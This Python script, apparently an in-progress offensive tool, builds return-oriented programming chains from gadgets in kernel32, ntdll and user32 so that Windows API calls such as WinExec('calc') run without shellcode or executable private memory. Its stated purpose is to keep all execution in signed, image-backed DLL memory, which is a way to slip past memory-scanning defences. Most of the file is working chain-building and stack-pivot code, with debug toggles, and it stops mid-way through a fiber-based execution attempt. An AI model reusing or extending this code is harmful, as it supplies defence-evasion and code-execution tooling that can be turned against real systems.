#!/usr/bin/env python3
"""
OIS-ROP Complete Executor
=========================

Executes arbitrary code using ONLY gadgets within signed Microsoft DLLs.

No shellcode in Private memory.
No RWX allocations.
All execution happens in Image-backed kernel32/ntdll.

The only "Private" memory is the chain data itself - which is just
a list of addresses (DATA, not CODE).

Author: Chris Aziz / Bombadil Systems
"""

import ctypes
import ctypes.wintypes as wintypes
import struct
import sys
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass


# =============================================================================
# WINDOWS CONSTANTS
# =============================================================================

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
INFINITE = 0xFFFFFFFF


# =============================================================================
# GADGET FINDER
# =============================================================================

@dataclass
class Gadget:
    address: int
    bytes: bytes
    module: str
    offset: int


class GadgetFinder:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self._setup_ctypes()
        self.modules: Dict[str, Tuple[int, int]] = {}
        self.module_data: Dict[str, bytes] = {}
        self._load_modules()
    
    def _setup_ctypes(self):
        self.kernel32.GetModuleHandleW.restype = ctypes.c_void_p
        self.kernel32.LoadLibraryW.restype = ctypes.c_void_p
        self.kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        self.kernel32.GetProcAddress.restype = ctypes.c_void_p
        self.kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
        self.kernel32.VirtualAlloc.restype = ctypes.c_void_p
        self.kernel32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]
        self.kernel32.VirtualFree.restype = ctypes.c_bool
        self.kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
        self.kernel32.CreateThread.restype = ctypes.c_void_p
        self.kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
        self.kernel32.WaitForSingleObject.restype = ctypes.c_ulong
        self.kernel32.CloseHandle.argtypes = [ctypes.c_void_p]
        self.kernel32.CloseHandle.restype = ctypes.c_bool
    
    def _load_modules(self):
        modules_to_load = ["kernel32.dll", "ntdll.dll", "user32.dll"]
        
        for mod_name in modules_to_load:
            handle = self.kernel32.GetModuleHandleW(mod_name)
            if not handle:
                handle = self.kernel32.LoadLibraryW(mod_name)
            
            if handle:
                # Get size from PE header
                e_lfanew = ctypes.c_uint32.from_address(handle + 0x3C).value
                size_of_image = ctypes.c_uint32.from_address(handle + e_lfanew + 24 + 56).value
                
                short_name = mod_name.replace(".dll", "")
                self.modules[short_name] = (handle, size_of_image)
                
                # Read module bytes for gadget searching
                read_size = min(size_of_image, 2 * 1024 * 1024)
                data = (ctypes.c_ubyte * read_size).from_address(handle)
                self.module_data[short_name] = bytes(data)
    
    def find_gadget(self, pattern: bytes, module: str = None) -> List[Gadget]:
        results = []
        modules_to_search = [module] if module else list(self.modules.keys())
        
        for mod_name in modules_to_search:
            if mod_name not in self.modules:
                continue
            
            base, size = self.modules[mod_name]
            data = self.module_data.get(mod_name, b'')
            
            offset = 0
            while True:
                idx = data.find(pattern, offset)
                if idx == -1:
                    break
                results.append(Gadget(
                    address=base + idx,
                    bytes=pattern,
                    module=mod_name,
                    offset=idx
                ))
                offset = idx + 1
        
        return results
    
    def get_function(self, module: str, function: str) -> int:
        handle = self.kernel32.GetModuleHandleW(f"{module}.dll")
        return self.kernel32.GetProcAddress(handle, function.encode())
    
    def find_all_gadgets(self) -> Dict[str, List[Gadget]]:
        gadgets = {}
        
        # Pop gadgets
        gadgets['pop_rcx'] = self.find_gadget(b'\x59\xC3')  # pop rcx; ret
        gadgets['pop_rdx'] = self.find_gadget(b'\x5A\xC3')  # pop rdx; ret
        gadgets['pop_rax'] = self.find_gadget(b'\x58\xC3')  # pop rax; ret
        gadgets['pop_r8'] = self.find_gadget(b'\x41\x58\xC3')  # pop r8; ret
        gadgets['pop_r9'] = self.find_gadget(b'\x41\x59\xC3')  # pop r9; ret
        
        # Call/jmp gadgets
        gadgets['jmp_rax'] = self.find_gadget(b'\xFF\xE0')  # jmp rax
        gadgets['call_rax'] = self.find_gadget(b'\xFF\xD0')  # call rax
        
        # Stack pivot gadgets
        gadgets['xchg_rax_rsp'] = self.find_gadget(b'\x48\x94\xC3')  # xchg rax, rsp; ret
        gadgets['mov_rsp_rax'] = self.find_gadget(b'\x48\x89\xC4\xC3')  # mov rsp, rax; ret
        gadgets['push_rax_ret'] = self.find_gadget(b'\x50\xC3')  # push rax; ret
        
        # Useful arithmetic
        gadgets['ret'] = self.find_gadget(b'\xC3')  # ret
        gadgets['add_rsp_8'] = self.find_gadget(b'\x48\x83\xC4\x08\xC3')  # add rsp, 8; ret
        gadgets['add_rsp_28'] = self.find_gadget(b'\x48\x83\xC4\x28\xC3')  # add rsp, 0x28; ret
        
        return gadgets


# =============================================================================
# ROP CHAIN BUILDER
# =============================================================================

class ROPChainBuilder:
    def __init__(self, finder: GadgetFinder):
        self.finder = finder
        self.gadgets = finder.find_all_gadgets()
        self.chain: List[int] = []
    
    def _get_gadget(self, name: str) -> int:
        gads = self.gadgets.get(name, [])
        if not gads:
            raise ValueError(f"Gadget '{name}' not found")
        return gads[0].address
    
    def add(self, value: int):
        self.chain.append(value)
        return self
    
    def pop_rcx(self, value: int):
        self.chain.append(self._get_gadget('pop_rcx'))
        self.chain.append(value)
        return self
    
    def pop_rdx(self, value: int):
        self.chain.append(self._get_gadget('pop_rdx'))
        self.chain.append(value)
        return self
    
    def pop_rax(self, value: int):
        self.chain.append(self._get_gadget('pop_rax'))
        self.chain.append(value)
        return self
    
    def pop_r8(self, value: int):
        self.chain.append(self._get_gadget('pop_r8'))
        self.chain.append(value)
        return self
    
    def call_function(self, addr: int):
        """Add function address - after setting up args, the ret will hit this."""
        self.chain.append(addr)
        return self
    
    def build(self) -> bytes:
        return b''.join(struct.pack('<Q', addr) for addr in self.chain)
    
    def dump(self):
        print("\nROP Chain:")
        print("-" * 60)
        for i, addr in enumerate(self.chain):
            # Try to identify what this is
            label = ""
            for name, gads in self.gadgets.items():
                for g in gads:
                    if g.address == addr:
                        label = f" <- {name} ({g.module})"
                        break
                if label:
                    break
            
            print(f"  [{i:2d}] 0x{addr:016X}{label}")


# =============================================================================
# EXECUTOR
# =============================================================================

class ROPExecutor:
    def __init__(self):
        self.finder = GadgetFinder()
        self.kernel32 = self.finder.kernel32
    
    def execute_winexec_calc(self):
        """
        Execute WinExec("calc", 1) using only ROP gadgets.
        
        All code execution happens within kernel32/ntdll Image memory.
        Only the chain data is in Private (RW, not RWX) memory.
        """
        
        print("=" * 70)
        print("OIS-ROP: Executing WinExec('calc') via ROP Chain")
        print("=" * 70)
        print()
        
        # Get function addresses
        winexec = self.finder.get_function("kernel32", "WinExec")
        exitthread = self.finder.get_function("kernel32", "ExitThread")
        messageboxa = self.finder.get_function("user32", "MessageBoxA")
        sleep_func = self.finder.get_function("kernel32", "Sleep")
        beep_func = self.finder.get_function("kernel32", "Beep")
        getpid = self.finder.get_function("kernel32", "GetCurrentProcessId")
        
        print(f"[*] WinExec:     0x{winexec:X}")
        print(f"[*] ExitThread:  0x{exitthread:X}")
        print(f"[*] MessageBoxA: 0x{messageboxa:X}")
        print(f"[*] Sleep:       0x{sleep_func:X}")
        print(f"[*] Beep:        0x{beep_func:X}")
        print(f"[*] GetPID:      0x{getpid:X}")
        
        # Find gadgets
        print("\n[*] Finding gadgets...")
        gadgets = self.finder.find_all_gadgets()
        
        for name, gads in gadgets.items():
            if gads:
                print(f"    {name}: {len(gads)} found (first @ 0x{gads[0].address:X} in {gads[0].module})")
                # Print all pop_rdx gadgets with context
                if name == 'pop_rdx':
                    for i, g in enumerate(gads):
                        context = (ctypes.c_ubyte * 10).from_address(g.address - 2)  # 2 bytes before + gadget + after
                        print(f"        [{i}] 0x{g.address:X} in {g.module}: context={bytes(context).hex()}")
        
        # Check for required gadgets
        required = ['pop_rcx', 'pop_rdx', 'ret']
        missing = [r for r in required if not gadgets.get(r)]
        if missing:
            print(f"\n[!] Missing required gadgets: {missing}")
            return False
        
        # Allocate RW memory for chain + string data
        # This is DATA, not CODE - no execute permission
        # NOTE: Need plenty of space BELOW the chain for stack growth (stack grows down)
        print("\n[*] Allocating RW memory for chain data...")
        
        chain_size = 0x10000  # 64KB - need room for stack to grow downward
        chain_mem = self.kernel32.VirtualAlloc(
            None,
            chain_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE  # RW only - NOT executable!
        )
        
        if not chain_mem:
            print("[!] VirtualAlloc failed")
            return False
        
        print(f"    Chain data at: 0x{chain_mem:X} (RW - not executable)")
        
        # Place command string at the beginning of our buffer
        # Try just "calc" - simpler command
        calc_string = b"calc\x00"
        calc_addr = chain_mem
        ctypes.memmove(calc_addr, calc_string, len(calc_string))
        
        # Also place a message string for MessageBoxA test
        msg_string = b"ROP!\x00\x00\x00\x00"
        msg_addr = chain_mem + 0x30  # Moved to avoid overlap
        ctypes.memmove(msg_addr, msg_string, len(msg_string))
        
        print(f"    'calc' string at: 0x{calc_addr:X}", flush=True)
        print(f"    'ROP!' string at: 0x{msg_addr:X}")
        
        # Build the ROP chain in the MIDDLE of our buffer
        # Stack grows DOWNWARD, so we need space below RSP for function calls
        chain_start = chain_mem + 0x8000  # 32KB offset - gives 32KB of stack space
        
        builder = ROPChainBuilder(self.finder)
        
        # x64 calling convention: RCX, RDX, R8, R9, then stack
        # WinExec(LPCSTR lpCmdLine, UINT uCmdShow)
        #   RCX = lpCmdLine ("calc")
        #   RDX = uCmdShow (1 = SW_SHOWNORMAL)
        
        # Build chain for WinExec("calc", 1)
        # x64 calling convention requires:
        # - 16-byte stack alignment before CALL
        # - 32 bytes of shadow space (0x20)
        # - RCX = first arg, RDX = second arg
        
        try:
            ret_addr = builder._get_gadget('ret')
            add_rsp_28 = None
            
            # Try to find add rsp, 0x28; ret for shadow space handling
            if gadgets.get('add_rsp_28'):
                add_rsp_28 = gadgets['add_rsp_28'][0].address
            
            # The chain layout:
            # We need shadow space AFTER the return address for WinExec
            # When WinExec is called, RSP should point to return address
            # and there should be 0x20 bytes of shadow space below
            
            # Actually, for ROP we can be simpler:
            # Just set up RCX, RDX, then "return" to WinExec
            # WinExec will use whatever shadow space exists
            
            builder.pop_rcx(calc_addr)      # RCX = "calc"
            builder.pop_rdx(1)              # RDX = SW_SHOWNORMAL
            
            # Add padding for alignment and shadow space
            # When we hit WinExec, RSP points to next item in chain
            # WinExec expects shadow space at [RSP], [RSP+8], [RSP+10], [RSP+18]
            
            # Add shadow space (4 x 8 bytes = 0x20)
            builder.add(0)  # Shadow space
            builder.add(0)  # Shadow space  
            builder.add(0)  # Shadow space
            builder.add(0)  # Shadow space
            
            # Return address for WinExec (where it returns to after)
            builder.add(ret_addr)  # WinExec returns here
            
            # Now call WinExec - but in ROP, we don't "call", we "ret" to it
            # So WinExec should be BEFORE the shadow space in the chain
            
            # Let me restructure:
            # [pop_rcx; ret] [calc_addr] [pop_rdx; ret] [1] [WinExec] [shadow x4] [return addr]
            #                                             ^-- RSP when WinExec starts
            
        except ValueError as e:
            print(f"\n[!] Failed to build chain: {e}")
            return False
        
        # Actually, let me rebuild properly
        builder.chain = []  # Clear
        
        # Proper x64 ROP chain:
        # When WinExec executes, RSP points to its return address
        # Shadow space is [RSP+8] through [RSP+28]
        # RSP must be 16-byte aligned at function entry (after the call pushes return addr)
        
        ret_addr = builder._get_gadget('ret')
        pop_rcx = builder._get_gadget('pop_rcx')
        pop_rdx = builder._get_gadget('pop_rdx')
        
        # For alignment: RSP should end in 0 or 8 at function entry
        # Our chain_start is at chain_mem + 0x100 = should be aligned
        
        # Let's first try a simpler test: just call ExitThread(0x1337)
        # to verify the ROP mechanism works at all
        
        print("\n[*] Testing with simple ExitThread(0x1337) first...")
        
        # Simple test chain:
        test_chain = [
            pop_rcx,        # pop rcx; ret
            0x1337,         # exit code
            exitthread,     # ExitThread(0x1337)
        ]
        
        # Build the actual WinExec chain with proper alignment
        # 
        # IMPORTANT: SetThreadContext sets RIP directly to the first gadget.
        # So RSP should point to the DATA that gadget expects, not the gadget address.
        #
        # For "pop rcx; ret":
        #   - RCX gets value at [RSP]
        #   - Then RET jumps to [RSP+8]
        #
        # So chain layout starting at RSP:
        #   [RSP+0x00] = value for RCX (calc_addr)
        #   [RSP+0x08] = return address (next gadget)
        #   etc.
        
        ret_addr = builder._get_gadget('ret')
        pop_rcx = builder._get_gadget('pop_rcx')
        pop_rdx = builder._get_gadget('pop_rdx')
        
        print("\n[*] Verifying gadgets are correct...")
        
        # Read and verify the actual bytes at gadget addresses
        def verify_gadget(name, addr, expected_bytes):
            actual = (ctypes.c_ubyte * len(expected_bytes)).from_address(addr)
            actual_bytes = bytes(actual)
            match = actual_bytes == expected_bytes
            print(f"    {name} @ 0x{addr:X}: {actual_bytes.hex()} {'✓' if match else '✗ MISMATCH!'}")
            return match
        
        verify_gadget("pop_rcx", pop_rcx, b'\x59\xC3')
        verify_gadget("pop_rdx", pop_rdx, b'\x5A\xC3')
        
        # Double-check pop_rdx with more context
        pop_rdx_context = (ctypes.c_ubyte * 8).from_address(pop_rdx)
        print(f"    pop_rdx context (8 bytes): {bytes(pop_rdx_context).hex()}")
        
        # Check WinExec is valid
        winexec_bytes = (ctypes.c_ubyte * 4).from_address(winexec)
        print(f"    WinExec @ 0x{winexec:X}: {bytes(winexec_bytes).hex()} (first 4 bytes)")
        
        # Check our string is correct
        notepad_bytes = (ctypes.c_ubyte * 16).from_address(calc_addr)
        print(f"    command string @ 0x{calc_addr:X}: {bytes(notepad_bytes)}")
        
        # Try MessageBoxA first - it's a simpler test
        # MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
        # RCX = 0 (NULL), RDX = lpText, R8 = lpCaption, R9 = 0 (MB_OK)
        
        USE_MESSAGEBOX = False  # Set to False to use WinExec
        USE_SIMPLE_TEST = False # Simple test PASSED!
        USE_SLEEP_TEST = False  # Sleep test PASSED!
        USE_BEEP_TEST = False   # Beep crashes with pop_rdx
        USE_GETPID_TEST = False # GetPID PASSED!
        USE_BEEP_CONTEXT = False # Beep via CONTEXT PASSED!
        USE_WINEXEC_CONTEXT = True  # Try WinExec with RCX/RDX via CONTEXT
        
        pop_r8 = None
        pop_r9 = None
        if gadgets.get('pop_r8'):
            pop_r8 = gadgets['pop_r8'][0].address
        if gadgets.get('pop_r9'):
            pop_r9 = gadgets['pop_r9'][0].address
        
        ret_gadget = builder._get_gadget('ret')
        
        if USE_SIMPLE_TEST:
            print("\n[*] SIMPLE TEST: ExitThread(0x42)...")
            print("    If this works, thread exits with code 66 (0x42)")
            print("    This verifies the ROP mechanism itself")
            
            # Simplest chain: just pop the exit code and call ExitThread
            # RIP starts at pop_rcx, RSP points to [0]
            builder.chain = [
                0x42,               # [0] -> popped into RCX (exit code)
                ret_gadget,         # [1] -> alignment
                exitthread,         # [2] -> ExitThread(0x42)
                0, 0, 0, 0, 0, 0,   # padding
            ]
        elif USE_SLEEP_TEST:
            print("\n[*] SLEEP TEST: Sleep(1000) then ExitThread(0x99)...")
            print("    Sleep takes 1 arg (RCX = milliseconds)")
            print("    If this works, we wait 1 second then exit with code 0x99")
            
            ret_gadget = builder._get_gadget('ret')
            
            # Get add_rsp_28 gadget
            add_rsp_28 = None
            if gadgets.get('add_rsp_28'):
                add_rsp_28 = gadgets['add_rsp_28'][0].address
                print(f"    add_rsp_28 gadget: 0x{add_rsp_28:X}")
            
            # Sleep(1000) - only needs RCX
            # Much simpler than WinExec - no process creation
            builder.chain = [
                1000,               # [0] -> popped into RCX (1000 ms)
                ret_gadget,         # [1] -> alignment
                sleep_func,         # [2] -> Sleep(1000)
                # Sleep returns here:
                add_rsp_28,         # [3] -> skip shadow space
                0xDEADBEEF,         # [4] -> shadow 1
                0xDEADBEEF,         # [5] -> shadow 2
                0xDEADBEEF,         # [6] -> shadow 3
                0xDEADBEEF,         # [7] -> shadow 4
                0xDEADBEEF,         # [8] -> slot 5
                # add_rsp_28 lands here:
                pop_rcx,            # [9] -> pop rcx; ret
                0x99,               # [10] -> exit code
                ret_gadget,         # [11] -> alignment
                exitthread,         # [12] -> ExitThread(0x99)
                0, 0, 0, 0,         # padding
            ]
        elif USE_WINEXEC_CONTEXT:
            print("\n[*] WINEXEC VIA CONTEXT: Set RCX/RDX in CONTEXT...")
            print("    RCX = pointer to 'calc', RDX = 1 (SW_SHOWNORMAL)")
            print("    This bypasses pop gadgets entirely")
            
            ret_gadget = builder._get_gadget('ret')
            
            # Get add_rsp_28 gadget
            add_rsp_28 = None
            if gadgets.get('add_rsp_28'):
                add_rsp_28 = gadgets['add_rsp_28'][0].address
            
            # Simple chain - just alignment and WinExec
            # We'll set RCX and RDX directly in CONTEXT
            builder.chain = [
                ret_gadget,         # [0] -> alignment
                ret_gadget,         # [1] -> alignment  
                winexec,            # [2] -> WinExec
                # WinExec returns here:
                add_rsp_28,         # [3] -> skip shadow space
                0xDEADBEEF,         # [4-8] -> shadow
                0xDEADBEEF,
                0xDEADBEEF,
                0xDEADBEEF,
                0xDEADBEEF,
                # add_rsp_28 lands here:
                pop_rcx,            # [9] -> pop rcx; ret  
                0x99,               # [10] -> exit code
                ret_gadget,         # [11] -> alignment
                exitthread,         # [12] -> ExitThread(0x99)
                0, 0, 0, 0,         # padding
            ]
            
            # Store calc_addr for use in context setting
            # We'll use the heap-allocated string
            self._winexec_string_addr = calc_addr
        elif USE_BEEP_CONTEXT:
            print("\n[*] BEEP VIA CONTEXT: Set RCX/RDX in CONTEXT, not via gadgets...")
            print("    RCX = 750 (frequency), RDX = 500 (duration)")
            print("    This bypasses the pop_rdx gadget entirely")
            
            ret_gadget = builder._get_gadget('ret')
            
            # Get add_rsp_28 gadget
            add_rsp_28 = None
            if gadgets.get('add_rsp_28'):
                add_rsp_28 = gadgets['add_rsp_28'][0].address
            
            # Simple chain - just alignment and Beep, no pop gadgets
            # We'll set RCX and RDX directly in CONTEXT
            builder.chain = [
                ret_gadget,         # [0] -> alignment (RIP starts at pop_rcx which will pop this)
                ret_gadget,         # [1] -> another ret
                beep_func,          # [2] -> Beep
                # Beep returns here:
                add_rsp_28,         # [3] -> skip shadow space
                0xDEADBEEF,         # [4-8] -> shadow
                0xDEADBEEF,
                0xDEADBEEF,
                0xDEADBEEF,
                0xDEADBEEF,
                # add_rsp_28 lands here:
                pop_rcx,            # [9] -> pop rcx; ret  
                0x99,               # [10] -> exit code
                ret_gadget,         # [11] -> alignment
                exitthread,         # [12] -> ExitThread(0x99)
                0, 0, 0, 0,         # padding
            ]
            
            # We'll set RCX and RDX in the SetThreadContext section
            # by modifying ctx.Rcx and ctx.Rdx before SetThreadContext
        elif USE_GETPID_TEST:
            print("\n[*] GETPID TEST: GetCurrentProcessId() then ExitThread(RAX)...")
            print("    GetCurrentProcessId takes 0 args, returns PID in RAX")
            print("    We'll then move RAX to RCX and call ExitThread")
            print("    Exit code should be the PID (non-zero)")
            
            ret_gadget = builder._get_gadget('ret')
            
            # Get add_rsp_28 gadget
            add_rsp_28 = None
            if gadgets.get('add_rsp_28'):
                add_rsp_28 = gadgets['add_rsp_28'][0].address
                print(f"    add_rsp_28 gadget: 0x{add_rsp_28:X}")
            
            # We need a way to move RAX to RCX
            # Option 1: Find "mov rcx, rax; ret" gadget
            # Option 2: Just use a fixed exit code for now
            
            # Simple version: Just call GetCurrentProcessId then ExitThread(0x77)
            # This tests if kernel32 functions work
            builder.chain = [
                ret_gadget,         # [0] -> dummy pop into RCX (we don't care)
                ret_gadget,         # [1] -> alignment
                getpid,             # [2] -> GetCurrentProcessId()
                # GetCurrentProcessId returns here:
                add_rsp_28,         # [3] -> skip shadow space
                0xDEADBEEF,         # [4-8] -> shadow
                0xDEADBEEF,
                0xDEADBEEF,
                0xDEADBEEF,
                0xDEADBEEF,
                # add_rsp_28 lands here:
                pop_rcx,            # [9] -> pop rcx; ret
                0x77,               # [10] -> exit code 0x77 (119)
                ret_gadget,         # [11] -> alignment
                exitthread,         # [12] -> ExitThread(0x77)
                0, 0, 0, 0,         # padding
            ]
        elif USE_BEEP_TEST:
            print("\n[*] BEEP TEST: Beep(750, 500) then ExitThread(0x99)...")
            print("    Beep takes 2 args: RCX = frequency (Hz), RDX = duration (ms)")
            print("    If this works, you'll hear a beep and exit code 0x99")
            
            ret_gadget = builder._get_gadget('ret')
            
            # Get add_rsp_28 gadget
            add_rsp_28 = None
            if gadgets.get('add_rsp_28'):
                add_rsp_28 = gadgets['add_rsp_28'][0].address
                print(f"    add_rsp_28 gadget: 0x{add_rsp_28:X}")
            
            # Beep(750, 500) - 750 Hz for 500ms
            # Two args: RCX = frequency, RDX = duration
            builder.chain = [
                750,                # [0] -> popped into RCX (frequency Hz)
                pop_rdx,            # [1] -> pop rdx; ret
                500,                # [2] -> popped into RDX (duration ms)
                ret_gadget,         # [3] -> alignment
                beep_func,          # [4] -> Beep(750, 500)
                # Beep returns here:
                add_rsp_28,         # [5] -> skip shadow space
                0xDEADBEEF,         # [6] -> shadow 1
                0xDEADBEEF,         # [7] -> shadow 2
                0xDEADBEEF,         # [8] -> shadow 3
                0xDEADBEEF,         # [9] -> shadow 4
                0xDEADBEEF,         # [10] -> slot 5
                # add_rsp_28 lands here:
                pop_rcx,            # [11] -> pop rcx; ret
                0x99,               # [12] -> exit code
                ret_gadget,         # [13] -> alignment
                exitthread,         # [14] -> ExitThread(0x99)
                0, 0, 0, 0,         # padding
            ]
        elif USE_MESSAGEBOX and messageboxa and pop_r8:
            print("\n[*] Using MessageBoxA test (4 arguments)...")
            
            # Get a simple ret gadget for alignment padding
            ret_gadget = builder._get_gadget('ret')

            # MessageBoxA(NULL, "ROP!", "ROP!", MB_OK)
            # RCX = 0, RDX = msg_addr, R8 = msg_addr, R9 = 0
            
            # NOTE: We insert 'ret_gadget' before 'messageboxa' to ensure
            # RSP is 16-byte aligned + 8 upon function entry.
            
            if pop_r9:
                builder.chain = [
                    0,                  # [0] -> RCX = 0 
                    pop_rdx,            # [1] 
                    msg_addr,           # [2] -> RDX
                    pop_r8,             # [3]   
                    msg_addr,           # [4] -> R8
                    pop_r9,             # [5] 
                    0,                  # [6] -> R9
                    ret_gadget,         # [7] Padding (Aligns Stack)
                    messageboxa,        # [8] ret to MessageBoxA (RSP ends in 8)
                    exitthread,         # [9] Returns here
                    0, 0, 0, 0,         # shadow
                ]
            else:
                # No pop_r9, try without (R9 might be garbage, but usually fine)
                builder.chain = [
                    0,                  # [0] -> RCX = 0
                    pop_rdx,            # [1] 
                    msg_addr,           # [2] -> RDX
                    pop_r8,             # [3]   
                    msg_addr,           # [4] -> R8
                    ret_gadget,         # [5] Padding (Aligns Stack)
                    messageboxa,        # [6] ret to MessageBoxA (RSP ends in 8)
                    exitthread,         # [7] Returns here
                    0, 0, 0, 0,         # shadow
                ]
        else:
            print("\n[*] Using WinExec test...")
            ret_gadget = builder._get_gadget('ret')
            
            # Get add_rsp_28 gadget to skip shadow space (0x28 = 0x20 shadow + 0x8 alignment)
            add_rsp_28 = None
            if gadgets.get('add_rsp_28'):
                add_rsp_28 = gadgets['add_rsp_28'][0].address
                print(f"    Found add_rsp_28 gadget: 0x{add_rsp_28:X}")
                
                # Verify the gadget bytes
                gadget_bytes = (ctypes.c_ubyte * 5).from_address(add_rsp_28)
                print(f"    Gadget bytes: {bytes(gadget_bytes).hex()}")
                expected = b'\x48\x83\xC4\x28\xC3'
                if bytes(gadget_bytes) != expected:
                    print(f"    WARNING: Expected {expected.hex()}, got {bytes(gadget_bytes).hex()}")
            else:
                print("    ERROR: No add_rsp_28 gadget found! Cannot proceed.")
                return False
            
            # Chain with proper shadow space:
            # After WinExec returns, it returns to add_rsp_28 which skips the shadow space
            # Then execution continues at pop_rcx for ExitThread
            #
            # Layout when WinExec is called:
            #   RSP+0x00 = return address (add_rsp_28)  [5]
            #   RSP+0x08 = shadow 1                      [6]
            #   RSP+0x10 = shadow 2                      [7]
            #   RSP+0x18 = shadow 3                      [8]
            #   RSP+0x20 = shadow 4                      [9]
            #
            # After WinExec returns to add_rsp_28:
            #   RSP points to [6]
            #   add rsp, 0x28 moves RSP by 5 QWORDs: [6] -> [11]
            #   ret pops [11] into RIP
            
            # Chain with proper shadow space (same pattern as working Sleep chain):
            # WinExec(lpCmdLine, uCmdShow) - 2 args: RCX, RDX
            #
            # KEY FIX: Put the command string ON THE STACK after the chain
            # This ensures locality - string is in same memory region as RSP
            #
            # Also zero R8/R9 just in case WinExec checks them
            
            # We'll put a placeholder for now and patch after we know stack address
            STRING_PLACEHOLDER = 0xAAAAAAAAAAAAAAAA
            
            # Get pop_r8 gadget if available
            pop_r8 = None
            if gadgets.get('pop_r8'):
                pop_r8 = gadgets['pop_r8'][0].address
                print(f"    pop_r8 gadget: 0x{pop_r8:X}")
            
            if pop_r8:
                # Full chain with R8 zeroed
                builder.chain = [
                    STRING_PLACEHOLDER, # [0] -> popped into RCX (will be patched)
                    pop_rdx,            # [1] -> RET target (pop rdx; ret)
                    1,                  # [2] -> popped into RDX (SW_SHOWNORMAL)
                    pop_r8,             # [3] -> pop r8; ret
                    0,                  # [4] -> R8 = 0
                    ret_gadget,         # [5] -> alignment padding
                    winexec,            # [6] -> WinExec
                    # WinExec returns here:
                    add_rsp_28,         # [7] -> skip shadow space
                    0xDEADBEEFDEADBEEF, # [8] -> shadow 1
                    0xDEADBEEFDEADBEEF, # [9] -> shadow 2
                    0xDEADBEEFDEADBEEF, # [10] -> shadow 3
                    0xDEADBEEFDEADBEEF, # [11] -> shadow 4
                    0xDEADBEEFDEADBEEF, # [12] -> slot 5 (for 0x28)
                    # add_rsp_28 lands here:
                    pop_rcx,            # [13] -> pop rcx; ret
                    0x99,               # [14] -> exit code
                    ret_gadget,         # [15] -> alignment
                    exitthread,         # [16] -> ExitThread(0x99)
                    0, 0, 0, 0, 0, 0,   # padding
                ]
            else:
                # Chain without R8 zeroing
                builder.chain = [
                    STRING_PLACEHOLDER, # [0] -> popped into RCX (will be patched)
                    pop_rdx,            # [1] -> RET target (pop rdx; ret)
                    1,                  # [2] -> popped into RDX (SW_SHOWNORMAL)
                    ret_gadget,         # [3] -> alignment padding
                    winexec,            # [4] -> WinExec
                    # WinExec returns here:
                    add_rsp_28,         # [5] -> skip shadow space (same as Sleep)
                    0xDEADBEEFDEADBEEF, # [6] -> shadow 1
                    0xDEADBEEFDEADBEEF, # [7] -> shadow 2
                    0xDEADBEEFDEADBEEF, # [8] -> shadow 3
                    0xDEADBEEFDEADBEEF, # [9] -> shadow 4
                    0xDEADBEEFDEADBEEF, # [10] -> slot 5 (for 0x28)
                    # add_rsp_28 lands here:
                    pop_rcx,            # [11] -> pop rcx; ret
                    0x99,               # [12] -> exit code
                    ret_gadget,         # [13] -> alignment
                    exitthread,         # [14] -> ExitThread(0x99)
                    0, 0, 0, 0, 0, 0,   # padding
                ]
        
        builder.dump()
        
        # Write chain to memory
        chain_bytes = builder.build()
        ctypes.memmove(chain_start, chain_bytes, len(chain_bytes))
        
        print(f"\n[*] Chain written to: 0x{chain_start:X}")
        print(f"    Chain size: {len(chain_bytes)} bytes")
        
        # Now we need to pivot RSP to chain_start and start executing
        # 
        # The trick: We use a small trampoline that:
        # 1. Sets RAX to our chain address
        # 2. Exchanges RSP with RAX (pivot)
        # 3. Returns (starts executing the chain)
        #
        # But wait - that trampoline would need to be in executable memory!
        #
        # Alternative: Use SetThreadContext to directly set RSP
        # Or: Use NtContinue with a crafted CONTEXT
        # Or: Find a gadget sequence that does the pivot
        
        print("\n[*] Attempting stack pivot...")
        
        # Method: Use CreateThread with a start address that naturally
        # leads to our chain. We need a gadget like:
        #   pop rsp; ret  (rare)
        #   xchg rax, rsp; ret (need to set rax first)
        #   mov rsp, [rax]; ret (dereference)
        
        # Let's look for a "pop rsp; ret" which would be ideal
        pop_rsp = self.finder.find_gadget(b'\x5C\xC3')  # pop rsp; ret
        
        if pop_rsp:
            print(f"    Found 'pop rsp; ret' at 0x{pop_rsp[0].address:X}")
            
            # Create a mini-chain:
            # [pop rsp; ret] -> [chain_start address] -> [chain begins]
            
            trampoline_addr = chain_mem + 0x80  # Between string and main chain
            trampoline = struct.pack('<Q', pop_rsp[0].address)  # pop rsp; ret
            trampoline += struct.pack('<Q', chain_start)         # value for RSP
            ctypes.memmove(trampoline_addr, trampoline, len(trampoline))
            
            # Now we need to get execution to trampoline_addr
            # We can do this with CreateThread if we find a way to hit our gadget
            
            print(f"    Trampoline at: 0x{trampoline_addr:X}")
            
        else:
            print("    No 'pop rsp; ret' gadget found")
            
            # Alternative: Look for xchg rax, rsp
            xchg = gadgets.get('xchg_rax_rsp', [])
            if xchg:
                print(f"    Found 'xchg rax, rsp; ret' at 0x{xchg[0].address:X}")
                print("    Would need to set RAX to chain address first")
        
        # For now, let's try a different approach:
        # Use the Windows API to call a function with our controlled stack
        #
        # NtQueueApcThread can queue an APC with arbitrary context
        # Or we can use fiber APIs
        
        print("\n[*] Trying fiber-based execution...")
        
        # ConvertThreadToFiber + CreateFiber approach
        # The fiber start routine will be our first gadget
        
        convert_fiber = self.finder.get_function("kernel32", "ConvertThreadToFiber")
        create_fiber = self.finder.get_function("kernel32", "CreateFiber")
        switch_fiber = self.finder.get_function("kernel32", "SwitchToFiber")
        delete_fiber = self.finder.get_function("kernel32", "DeleteFiber")
        
        if convert_fiber and create_fiber:
            print(f"    ConvertThreadToFiber: 0x{convert_fiber:X}")
            print(f"    CreateFiber: 0x{create_fiber:X}")
